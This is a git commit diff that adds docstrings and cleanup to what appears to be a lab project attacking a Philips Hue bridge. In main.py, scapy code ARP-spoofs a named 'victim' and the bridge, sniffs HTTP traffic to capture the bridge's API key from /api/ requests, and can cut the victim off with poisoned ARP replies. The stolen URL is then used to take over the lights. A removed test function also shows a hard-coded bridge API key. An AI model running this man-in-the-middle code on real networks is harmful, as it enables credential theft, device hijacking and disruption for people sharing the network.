89473494a12f3c5a22e340db3aed0b99014aaa36
Charmeister11 <tsutavicius@gmail.com>
2023-06-11 21:17:27 +0200

    added commments, and cleaned up code

--- light_control.py
+++ light_control.py
@@ -11,26 +11,40 @@ rainbow_colors = [
     64984,  # Violet
 ]
 
-# Custom order of lights
+# Custom order of lights to reflect how the lights are arranged in real life
 custom_order = [1, 2, 3, 6, 5, 4]
 
 
 def on_off(base_url, light_nr, state):
+    """
+    Turn on/off the light using the Philips Hue API.
+    :param base_url: The base URL to access the Philips Hue API.
+    :param light_nr: The number of the light to turn on/off (1-6)
+    :param state: The state to set the light to (True/False)
+    """
     url = f"{base_url}/{light_nr}/state"
-    headers = {}
-    data = {"on": state}
-    response = requests.put(url, headers=headers, json=data, verify=False)
+    response = requests.put(url, json={"on": state}, verify=False)
     print(f"PUT request sent to {url}, status code: {response.status_code}")
 
 
 def set_light_color(base_url, light_id, hue):
+    """
+    Set the light's color using the Philips Hue API.
+    :param base_url: The base URL to access the Philips Hue API.
+    :param light_id: The ID of the light to set the color of (1-6)
+    :param hue: The hue value to set the light to (0-65535)
+    """
     url = f"{base_url}/{light_id}/state"
-    payload = {"hue": hue}
-    response = requests.put(url, json=payload, verify=False)
+    response = requests.put(url, json={"hue": hue}, verify=False)
     print(f"Set light {light_id} color, status code: {response.status_code}")
 
 
 def retrieve_lights(base_url):
+    """
+    Retrieve the light's information using the Philips Hue API.
+    :param base_url: The base URL to access the Philips Hue API.
+    :return: JSON object containing information about the lights
+    """
     response = requests.get(base_url, verify=False)
     print(f"Get request sent to {base_url}, status code: {response.status_code}")
 
@@ -41,25 +55,27 @@ def retrieve_lights(base_url):
         return None
 
 
-import requests
-
-
 def turn_off_all_lights(base_url, lights, state):
     """
     Turn off all lights using the Philips Hue API.
-    :param state:
-    :param lights:
+    :param state: state of the lights (on/off)
+    :param lights: JSON object containing information about the lights
     :param base_url: The base URL to access the Philips Hue API.
     """
     # Loop through each light and turn it off
     for light_id in lights:
         requests.put(f"{base_url}/{light_id}/state", json={"on": state}, verify=False)
-        print(f"{base_url}/{light_id}/state")
         print(f"Turned off light {light_id}")
 
 
 def process_lights(base_url, lights):
+    """
+    Process the lights using the Philips Hue API.
+    :param base_url: The base URL to access the Philips Hue API.
+    :param lights: JSON object containing information about the lights
+    """
     if lights is not None:
+        # Loop through each light and check if it is on, and change its color
         for index, light_id in enumerate(custom_order):
             str_light_id = str(light_id)
             if str_light_id in lights and 'state' in lights[str_light_id]:
@@ -76,16 +92,12 @@ def process_lights(base_url, lights):
 
 
 def get_light_colors(lights):
-        for light_id in custom_order:
-            str_light_id = str(light_id)
-            if str_light_id in lights and 'state' in lights[str_light_id] and 'hue' in lights[str_light_id]['state']:
-                hue = lights[str_light_id]['state']['hue']
-                print(f"Light {light_id} has hue: {hue}")
-
-def test():
-    base_url = "https://192.168.1.247/api/D2FyCAxPndXkL71a6l5PlTuhCM6aCTMf-NSiB7Ns/lights"
-    lights = retrieve_lights(base_url=base_url)
-    turn_off_all_lights(base_url, lights)
-    # process_lights(base_url, lights)
-    # get_light_colors(lights)
-# test()
+    """
+    Print the colors of the lights.
+    :param lights: JSON object containing information about the lights
+    """
+    for light_id in custom_order:
+        str_light_id = str(light_id)
+        if str_light_id in lights and 'state' in lights[str_light_id] and 'hue' in lights[str_light_id]['state']:
+            hue = lights[str_light_id]['state']['hue']
+            print(f"Light {light_id} has hue: {hue}")
--- main.py
+++ main.py
@@ -5,35 +5,61 @@ from scapy.layers.l2 import ARP, Ether
 from scapy.layers.http import HTTPRequest
 from scapy.sendrecv import sniff, srp, sendp
 
-target_ip = "192.168.1.5"
-gateway_ip = "192.168.1.247"
-interface = "Wi-Fi"
-stop_sniffing = [False]
-stop_spoofing = [False]
+target_ip = "192.168.1.5" # IP address of the victim / user of the huestacean app
+gateway_ip = "192.168.1.247" # IP address of the Philips Hue bridge
+interface = "Wi-Fi" # Network interface to use
+stop_sniffing = [False] # Used to stop the packet sniffer
+stop_spoofing = [False] # Used to stop the ARP spoofing
 
+# Disable SSL warnings, as we are not using any SSL certificates since we are in a safe and isolated environment
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-def arp_spoof(target_ip, spoof_ip, interface='Wi-Fi'):
+def arp_spoof(target_ip, spoof_ip, interface):
+    """
+    Send an ARP spoofing packet to the target IP address.
+    :param target_ip: IP address of the target
+    :param spoof_ip: IP that we pretend is sending the packet
+    :param interface: Network interface to use
+    """
     target_mac = get_mac(target_ip)
     packet = Ether() / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     sendp(packet, iface=interface, verbose=False)
 
 
 def arp_block(target_ip, gateway_ip, interface='Wi-Fi'):
-    fake_mac = "ff:ff:ff:ff:ff:ff"  # This is a fake MAC address
-    packet = Ether() / ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=fake_mac)
+    """
+    Send an ARP spoofing packet that disconnects communication between target_ip and gateway_ip.
+    :param target_ip: IP address of the target
+    :param gateway_ip: IP address of the other target
+    :param interface: Network interface to use
+    """
+    target_mac = get_mac(target_ip)
+    packet = Ether() / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc="ff:ff:ff:ff:ff:ff")
     sendp(packet, iface=interface, verbose=False)
 
 
 def get_mac(ip):
+    """
+    Get the MAC address of the device with the given IP address.
+    :param ip: IP address of the device
+    :return: MAC address of the device
+    """
     response, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=2, retry=10, verbose=False)
     for _, packet in response:
         return packet[Ether].src
 
 
-def sniff_packets(interface='Wi-Fi'):
+def sniff_packets(interface):
+    """
+    Sniff packets on the given interface and process them.
+    :param interface: Network interface to use
+    """
     def process_packet(packet):
+        """
+        Process a packet and check if it is the GET request to the Philips Hue bridge that we want.
+        :param packet: Packet to process
+        """
         if packet.haslayer(HTTPRequest):
             http_layer = packet[HTTPRequest]
             if http_layer.fields['Method'] == b'GET' and http_layer.fields['Path'][:5] == b'/api/' and len(
@@ -48,6 +74,10 @@ def sniff_packets(interface='Wi-Fi'):
 
 
 def initiate_rainbow(url):
+    """
+    Initiate the light demo sequence on the Philips Hue bridge/lights.
+    :param url: URL to send the requests to
+    """
     time.sleep(60)
     lights = lc.retrieve_lights(url)
     lc.process_lights(url, lights)
@@ -60,6 +90,9 @@ def initiate_rainbow(url):
 
 
 def main():
+    """
+    Main function that starts the ARP spoofing and packet sniffing.
+    """
     sniffer_thread = threading.Thread(target=sniff_packets, args=(interface,), daemon=True)
     sniffer_thread.start()
     try:
